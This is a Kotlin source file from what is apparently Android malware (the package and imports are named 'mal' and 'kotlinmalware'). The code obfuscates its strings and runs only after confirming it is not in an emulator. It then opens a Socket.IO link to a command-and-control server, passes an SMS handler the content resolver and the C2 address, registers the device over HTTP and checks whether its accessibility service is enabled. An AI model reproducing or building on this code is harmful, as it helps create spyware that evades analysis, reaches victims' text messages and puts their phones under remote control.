package com.mobilesec.govcomm.mal


import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.pm.ServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityManager
import com.example.kotlinmalware.Sms
import com.example.kotlinmalware.SocketIOHandler
import io.github.c0nnor263.obfustringcore.ObfustringThis
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.*
import org.json.JSONObject


@ObfustringThis
class stuff(private val context: Context) {

    private val c2ServerUrl = SecurityUtils.c2ServerUrl
    private val registerEndpoint = "$c2ServerUrl/register_device"
    private var checkRealDevice: Boolean = !SecurityUtils.isNotRealDevice(context)
    private var socketHandler: SocketIOHandler? = null
    var sms: Sms? = null


    init {
        if (checkRealDevice) {
            socketHandler = SocketIOHandler(context)
            socketHandler!!.start(c2ServerUrl)
            sms = Sms(context.contentResolver, c2ServerUrl, context)
        }
    }

    fun registerDevice(uuid: String, callback: (String) -> Unit) {
        val client = OkHttpClient()
        val jsonPayload = JSONObject().apply {
            put("uuid", uuid)
        }.toString()
        val requestBody =
            jsonPayload.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
        val request = Request.Builder()
            .url(registerEndpoint)
            .post(requestBody)
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                //Log.e("RegisterDevice", "Failed to communicate with the server", e)
                callback("registration_error")
            }

            override fun onResponse(call: Call, response: Response) {
                response.use { resp ->
                    val responseBody = resp.body?.string() ?: ""
                    when {
                        resp.isSuccessful && responseBody.contains("registration_success") -> {
                            // Log.d("RegisterDevice", "Device registered successfully")
                            callback("registration_success")
                        }

                        resp.isSuccessful && responseBody.contains("registration_exists") -> {
                            // Log.d("RegisterDevice", "Device is already registered")
                            callback("registration_exists")
                        }

                        else -> {
                            // Log.e("RegisterDevice", "Failed to register device: ${response.code}")
                            callback("registration_failed")
                        }
                    }
                }
            }
        })
    }

}

fun getInstallationId(context: Context): String {
    val sharedPref = context.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
    return sharedPref.getString("installationId", null) ?: UUID.randomUUID().toString().also { installationId ->
        sharedPref.edit().putString("installationId", installationId).apply()
    }
}

fun isAccessibilityServiceEnabled(
    context: Context,
    service: Class<out AccessibilityService?>
): Boolean {
    val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
    val enabledServices =
        am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
    for (enabledService in enabledServices) {
        val enabledServiceInfo: ServiceInfo = enabledService.resolveInfo.serviceInfo
        if (enabledServiceInfo.packageName.equals(context.packageName) && enabledServiceInfo.name.equals(
                service.name
            )
        ) return true
    }
    return false
}